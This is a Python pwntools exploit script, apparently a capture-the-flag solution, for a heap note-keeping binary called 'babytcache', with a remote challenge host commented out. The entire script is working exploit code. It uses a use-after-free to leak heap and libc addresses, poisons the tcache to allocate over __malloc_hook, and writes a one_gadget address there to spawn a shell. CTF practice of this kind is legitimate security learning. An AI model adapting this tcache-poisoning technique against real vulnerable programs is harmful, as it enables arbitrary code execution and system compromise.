#!/usr/bin/env python2
from pwn import *

# p = process("./babytcache")
p = process(['./ld-2.23_64.so', './babytcache'], env={"LD_PRELOAD": os.path.abspath('./libc-2.23.so')})
# p = remote("51.158.118.84", 17002)
# gdb.attach(p)
string = "Your Note :"
str_len = len(string)

def add(index, data, size = None):
	p.sendlineafter(">> ", "1")
	p.sendlineafter("index:\n", str(index))
	if not size:
		size = len(data)
	p.sendlineafter("size:\n", str(size))
	p.sendafter("data:\n", data)

def edit(index, data):
	p.sendlineafter(">> ", "2")
	p.sendlineafter("index:\n", str(index))
	p.sendafter("data:\n", data)

def delete(index):
	p.sendlineafter(">> ", "3")
	p.sendlineafter("index:\n", str(index))

def view(index):
	p.sendlineafter(">> ", "4")
	p.sendlineafter("index:\n", str(index))
	return p.recvuntil("\n\n")[str_len:-2]

add(0,"A"*0x200)
add(1,"B"*0x200)
add(2,"C"*0x200)

delete(0)
delete(1)

heap_base = u64(view(1).ljust(8, "\x00")) - 0x260
log.info("Heap : 0x{:x}".format(heap_base))

edit(1,p64(heap_base+0x250))
add(3,"D"*0x200)
add(4,p64(0)+p64(0x421)+"\n",0x200)

delete(0)
libc_base = u64(view(0).ljust(8, "\x00")) - 0x3ebca0
log.info("Libc : 0x{:x}".format(libc_base))

malloc_hook = libc_base + 0x3ebc30
one_gadget = libc_base + 0x10a38c

delete(3)
edit(3,p64(malloc_hook))
add(5,"F"*0x200)
add(6,p64(one_gadget)+"\n",0x200)

#just get the shell now
p.sendlineafter(">> ", "1")
p.sendlineafter("index:\n", "7")
p.sendlineafter("size:\n", str(0x200))

p.interactive()
